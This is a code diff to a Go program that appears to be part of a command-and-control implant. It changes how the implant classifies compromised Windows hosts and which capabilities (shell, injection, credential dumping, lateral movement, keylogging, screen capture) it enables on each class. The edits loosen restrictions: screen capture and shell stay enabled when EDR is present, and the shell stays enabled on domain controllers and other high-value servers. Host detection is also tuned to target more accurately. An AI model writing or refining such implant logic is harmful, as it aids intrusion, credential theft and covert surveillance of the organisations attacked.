@@ -37,7 +37,10 @@ var defaultProfiles = map[EnvClass]OpsProfile{
 		Class: EnvCorporate, ClassLabel: "corporate",
 		AllowShell: true, AllowInjection: true, AllowCredDump: true,
 		AllowPersistence: false, AllowLateral: true, AllowKeylogger: false,
-		AllowScreenCapture: false, AllowTokenOps: true,
+		// A domain-joined workstation is not automatically a protected server
+		// or an EDR-managed endpoint. Allow operator-requested capture here;
+		// classify() disables it again whenever EDR is detected.
+		AllowScreenCapture: true, AllowTokenOps: true,
 		MaxBeaconJitter: 20, MinBeaconInterval: 60,
 		OfficeHoursOnly: true,
 	},
@@ -194,7 +197,9 @@ func (ed *EnvironmentDetector) classify() {
 	// Determine environment class
 	class := EnvHome
 
-	if ed.isDC || ed.isExch || ed.isSQL {
+	// High-value is for actual DC/Exchange/SQL *servers*, not a workstation
+	// that can see a DC (nltest) or has SSMS/LocalDB registry keys.
+	if ed.isServer && (ed.isDC || ed.isExch || ed.isSQL) {
 		class = EnvHighValue
 	} else if ed.isServer && ed.domainName != "" {
 		class = EnvServer
@@ -206,27 +211,33 @@ func (ed *EnvironmentDetector) classify() {
 		class = EnvCorporate
 	}
 
-	p := defaultProfiles[class]
+	p := adjustedOpsProfile(class, len(ed.edrProducts) > 0)
+	ed.profile = &p
+}
 
-	// Adjust profile based on detected security products
-	if len(ed.edrProducts) > 0 {
-		p.AllowInjection = false
-		p.AllowKeylogger = false
-		p.AllowScreenCapture = false
+func adjustedOpsProfile(class EnvClass, hasEDR bool) OpsProfile {
+	p := defaultProfiles[class]
+	if hasEDR {
+		// Corporate workstations with EDR: keep operator triage capabilities
+		// (shell/screen) enabled; only high-value/server get full lockdown.
+		if class == EnvHighValue || class == EnvServer {
+			p.AllowInjection = false
+			p.AllowKeylogger = false
+			p.AllowScreenCapture = false
+		}
 		if p.MinBeaconInterval < 120 {
 			p.MinBeaconInterval = 120
 		}
 		p.MaxBeaconJitter = 15
 	}
 
-	// High-value read-only adjustments
+	// High-value: keep injection/persistence quiet, but interactive shell is
+	// the operator's primary control channel and must stay enabled.
 	if class == EnvHighValue {
-		p.AllowShell = false
 		p.AllowPersistence = false
 		p.AllowInjection = false
 	}
-
-	ed.profile = &p
+	return p
 }
 
 func (ed *EnvironmentDetector) isLikelySandbox() bool {
@@ -338,15 +349,11 @@ func (ed *EnvironmentDetector) countServices() int {
 }
 
 func (ed *EnvironmentDetector) checkDomainController() bool {
+	// NTDS exists only on a DC. nltest /DSGETDC succeeds on every domain-joined
+	// workstation and must not promote the host to high_value.
 	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SYSTEM\CurrentControlSet\Services\NTDS`, registry.READ)
 	if err == nil {
 		k.Close()
-		return true
-	}
-	cmd := exec.Command("cmd", "/c", "nltest", "/DSGETDC:"+ed.domainName)
-	applyHideWindow(cmd)
-	out, err := cmd.Output()
-	if err == nil && strings.Contains(strings.ToLower(string(out)), "dc") {
 		return true
 	}
 	return false
@@ -362,7 +369,9 @@ func (ed *EnvironmentDetector) checkExchange() bool {
 }
 
 func (ed *EnvironmentDetector) checkSQLServer() bool {
-	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Microsoft SQL Server`, registry.READ)
+	// SSMS / client tools write SOFTWARE\Microsoft\Microsoft SQL Server.
+	// Instance Names\SQL is present only when a database engine is installed.
+	k, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Microsoft SQL Server\Instance Names\SQL`, registry.READ)
 	if err == nil {
 		k.Close()
 		return true
